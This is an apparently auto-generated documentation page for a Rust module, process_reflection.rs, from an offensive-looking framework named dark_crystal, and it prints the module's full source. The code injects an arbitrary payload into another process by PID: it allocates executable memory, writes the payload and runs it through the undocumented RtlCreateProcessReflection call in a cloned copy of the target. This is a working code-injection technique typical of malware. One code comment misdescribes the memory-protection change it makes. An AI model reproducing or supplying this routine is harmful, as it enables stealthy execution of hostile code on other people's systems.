# process_reflection

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/injection/process_reflection.rs` |
| **Lines** | 124 |
| **Cards** | T007-process-injection |
| **Role** | Process reflection |
| **Unsafe blocks** | 1 |

## Constants

- `RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES`: `u32` = `0x00000002`
- `RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE`: `u32` = `0x00000004`

## Types

### struct `ClientId` (line 13)

### struct `RtlpProcessReflectionInformation` (line 19)

## Public API

### `try_process_reflection` `unsafe` (line 37)
```rust
pub unsafe fn try_process_reflection(pid: u32, payload: &[u8]) -> bool
```

## Key Dependencies

- `use windows::core::PCSTR;`
- `use windows::Win32::Foundation::{CloseHandle, HANDLE, NTSTATUS, STATUS_SUCCESS};`
- `use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;`
- `use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};`
- `use windows::Win32::System::Memory::{`
- `use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};`

## Full Source

```rust
use std::ffi::c_void;
use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE, NTSTATUS, STATUS_SUCCESS};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{
    VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

#[repr(C)]
pub struct ClientId {
    pub unique_process: HANDLE,
    pub unique_thread: HANDLE,
}

#[repr(C)]
pub struct RtlpProcessReflectionInformation {
    pub reflection_process_handle: HANDLE,
    pub reflection_thread_handle: HANDLE,
    pub reflection_client_id: ClientId,
}

pub type RtlCreateProcessReflectionFn = unsafe extern "system" fn(
    process_handle: HANDLE,
    flags: u32,
    start_routine: *mut c_void,
    start_context: *mut c_void,
    event_handle: HANDLE,
    reflection_information: *mut RtlpProcessReflectionInformation,
) -> NTSTATUS;

pub const RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES: u32 = 0x00000002;
pub const RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE: u32 = 0x00000004;

pub unsafe fn try_process_reflection(pid: u32, payload: &[u8]) -> bool {
    if payload.is_empty() {
        return false;
    }
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if h_process.is_err() {
        return false;
    }
    let h_process = h_process.unwrap();

    let remote_mem = VirtualAllocEx(
        h_process,
        None,
        payload.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    if remote_mem.is_null() {
        let _ = CloseHandle(h_process);
        return false;
    }

    let mut written = 0;
    if WriteProcessMemory(
        h_process,
        remote_mem,
        payload.as_ptr() as *const c_void,
        payload.len(),
        Some(&mut written),
    )
    .is_err()
    {
        let _ = VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
        let _ = CloseHandle(h_process);
        return false;
    }

    // Harden: drop RX permission after copy
    let mut old = PAGE_PROTECTION_FLAGS(0);
    let _ = VirtualProtectEx(
        h_process,
        remote_mem,
        payload.len(),
        PAGE_EXECUTE_READ,
        &mut old,
    );

    let ntdll = GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr()));
    if ntdll.is_err() {
        let _ = VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
        let _ = CloseHandle(h_process);
        return false;
    }
    let ntdll = ntdll.unwrap();

    let rtl_create_process_reflection =
        GetProcAddress(ntdll, PCSTR(b"RtlCreateProcessReflection\0".as_ptr()));
    if rtl_create_process_reflection.is_none() {
        let _ = VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
        let _ = CloseHandle(h_process);
        return false;
    }

    let rtl_create_process_reflection: RtlCreateProcessReflectionFn =
        std::mem::transmute(rtl_create_process_reflection.unwrap());

    let mut info: RtlpProcessReflectionInformation = std::mem::zeroed();
    let status = rtl_create_process_reflection(
        h_process,
        RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
        remote_mem,
        std::ptr::null_mut(),
        HANDLE::default(),
        &mut info,
    );

    if status == STATUS_SUCCESS {
        let _ = CloseHandle(info.reflection_process_handle);
        let _ = CloseHandle(info.reflection_thread_handle);
        let _ = VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
        let _ = CloseHandle(h_process);
        true
    } else {
        let _ = VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
        let _ = CloseHandle(h_process);
        false
    }
}

```